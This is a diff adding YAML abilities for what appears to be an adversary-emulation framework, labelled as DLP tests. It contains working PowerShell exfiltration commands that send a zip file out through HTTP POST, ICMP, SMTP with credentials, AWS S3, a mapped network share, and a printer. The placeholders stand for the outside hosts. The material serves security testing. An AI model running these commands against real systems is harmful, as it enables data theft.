@@ -1,0 +1,186 @@
+- id: 94f4c6f5-6b3d-4b4e-8a7c-123456789004
+  name: DLP - Exfiltrate via HTTP POST
+  description: Sends collected data via HTTP POST to external server (DLP Test)
+  tactic: exfiltration
+  technique:
+    attack_id: T1048
+    name: Exfiltration Over Alternative Protocol
+  platforms:
+    windows:
+      psh:
+        command: |
+          $fileToUpload = "$env:TEMP\dlp_data_#{paw}.zip";
+          if (Test-Path $fileToUpload) {
+              $webhookUrl = "#{http.exfil.url}";
+              $boundary = [System.Guid]::NewGuid().ToString();
+              $fileContent = [System.IO.File]::ReadAllBytes($fileToUpload);
+              $fileName = [System.IO.Path]::GetFileName($fileToUpload);
+              $bodyLines = (
+                  "--$boundary",
+                  "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
+                  "Content-Type: application/zip",
+                  "",
+                  [System.Text.Encoding]::Default.GetString($fileContent),
+                  "--$boundary--"
+              );
+              $body = $bodyLines -join "`r`n";
+              try {
+                  Invoke-WebRequest -Uri $webhookUrl -Method POST -ContentType "multipart/form-data; boundary=$boundary" -Body $body;
+                  Write-Output "[DLP] Data uploaded to $webhookUrl";
+              } catch {
+                  Write-Output "[DLP] Upload failed: $_";
+              }
+          } else {
+              Write-Output "[DLP] No data file found to exfiltrate";
+          }
+        payloads: []
+        requirements:
+          - - http.exfil.url
+
+- id: 94f4c6f5-6b3d-4b4e-8a7c-123456789005
+  name: DLP - Exfiltrate via ICMP (Ping Tunnel)
+  description: Exfiltrates small data chunks via ICMP echo requests (DLP Test)
+  tactic: exfiltration
+  technique:
+    attack_id: T1048
+    name: Exfiltration Over Alternative Protocol
+  platforms:
+    windows:
+      psh:
+        command: |
+          $data = "DLP_TEST_DATA_#{paw}_" + (Get-Date -Format "yyyyMMddHHmmss");
+          $bytes = [System.Text.Encoding]::UTF8.GetBytes($data);
+          $encoded = [System.Convert]::ToBase64String($bytes);
+          ping -n 1 -l 32 -w 1000 "#{icmp.target}";
+          Write-Output "[DLP] Sent ICMP data: $encoded";
+        payloads: []
+        requirements:
+          - - icmp.target
+
+- id: 94f4c6f5-6b3d-4b4e-8a7c-123456789006
+  name: DLP - Email Exfiltration via SMTP
+  description: Sends data as email attachment via SMTP (DLP Test)
+  tactic: exfiltration
+  technique:
+    attack_id: T1048.003
+    name: Exfiltration Over Unencrypted Protocol
+  platforms:
+    windows:
+      psh:
+        command: |
+          $smtpServer = "#{smtp.server}";
+          $smtpPort = #{smtp.port};
+          $fromEmail = "#{smtp.from}";
+          $toEmail = "#{smtp.to}";
+          $password = "#{smtp.password}";
+          $attachment = "$env:TEMP\dlp_data_#{paw}.zip";
+          if (Test-Path $attachment) {
+              $message = New-Object System.Net.Mail.MailMessage($fromEmail, $toEmail);
+              $message.Subject = "DLP Test Data #{paw}";
+              $message.Body = "DLP test exfiltration data attached.";
+              $attachmentObj = New-Object System.Net.Mail.Attachment($attachment);
+              $message.Attachments.Add($attachmentObj);
+              $smtp = New-Object System.Net.Mail.SmtpClient($smtpServer, $smtpPort);
+              $smtp.EnableSsl = $true;
+              $smtp.Credentials = New-Object System.Net.NetworkCredential($fromEmail, $password);
+              try {
+                  $smtp.Send($message);
+                  Write-Output "[DLP] Email sent to $toEmail";
+              } catch {
+                  Write-Output "[DLP] Email failed: $_";
+              }
+              $attachmentObj.Dispose();
+          }
+        payloads: []
+        requirements:
+          - - smtp.server
+            - smtp.port
+            - smtp.from
+            - smtp.to
+            - smtp.password
+
+- id: 94f4c6f5-6b3d-4b4e-8a7c-123456789007
+  name: DLP - Cloud Upload to AWS S3
+  description: Uploads data to AWS S3 bucket (DLP Test)
+  tactic: exfiltration
+  technique:
+    attack_id: T1567.002
+    name: Exfiltration to Cloud Storage
+  platforms:
+    windows:
+      psh:
+        command: |
+          $file = "$env:TEMP\dlp_data_#{paw}.zip";
+          if (Test-Path $file) {
+              $bucket = "#{aws.bucket}";
+              $region = "#{aws.region}";
+              $key = "exfiltration/#{paw}/$(Get-Date -Format 'yyyyMMddHHmmss').zip";
+              if (Get-Command aws -ErrorAction SilentlyContinue) {
+                  aws s3 cp $file "s3://$bucket/$key" --region $region;
+                  Write-Output "[DLP] Uploaded to S3: $bucket/$key";
+              } else {
+                  Write-Output "[DLP] AWS CLI not installed";
+              }
+          }
+        payloads: []
+        requirements:
+          - - aws.bucket
+            - aws.region
+
+- id: 94f4c6f5-6b3d-4b4e-8a7c-123456789010
+  name: DLP - Network Share Copy
+  description: Copies data to network share (DLP Test)
+  tactic: exfiltration
+  technique:
+    attack_id: T1039
+    name: Data from Network Shared Drive
+  platforms:
+    windows:
+      psh:
+        command: |
+          $source = "$env:TEMP\dlp_data_#{paw}.zip";
+          $sharePath = "#{network.share.path}";
+          $username = "#{network.share.user}";
+          $password = "#{network.share.pass}";
+          if (Test-Path $source) {
+              $driveLetter = "Z:";
+              net use $driveLetter $sharePath /USER:$username $password 2>$null;
+              if ($LASTEXITCODE -eq 0) {
+                  $dest = "$driveLetter\dlp_data_#{paw}.zip";
+                  Copy-Item $source $dest -Force;
+                  net use $driveLetter /DELETE 2>$null;
+                  Write-Output "[DLP] Data copied to network share";
+              } else {
+                  Write-Output "[DLP] Failed to map network drive";
+              }
+          }
+        payloads: []
+        requirements:
+          - - network.share.path
+            - network.share.user
+            - network.share.pass
+
+- id: 94f4c6f5-6b3d-4b4e-8a7c-123456789011
+  name: DLP - Printer Data Exfiltration
+  description: Prints sensitive data to network printer (DLP Test)
+  tactic: exfiltration
+  technique:
+    attack_id: T1052
+    name: Exfiltration Over Physical Medium
+  platforms:
+    windows:
+      psh:
+        command: |
+          $printFile = "$env:TEMP\dlp_print_#{paw}.txt";
+          "=== CONFIDENTIAL DLP TEST DATA ===`nAgent: #{paw}`nTime: $(Get-Date)`nData: Project secrets and financials`n=== END ===" | Out-File $printFile;
+          $printer = "#{printer.name}";
+          if ($printer) {
+              Start-Process -FilePath $printFile -Verb Print -ErrorAction SilentlyContinue;
+              Write-Output "[DLP] Sent data to printer: $printer";
+          } else {
+              Get-Content $printFile | Out-Printer;
+              Write-Output "[DLP] Printed data to default printer";
+          }
+        payloads: []
+        requirements:
+          - - printer.name
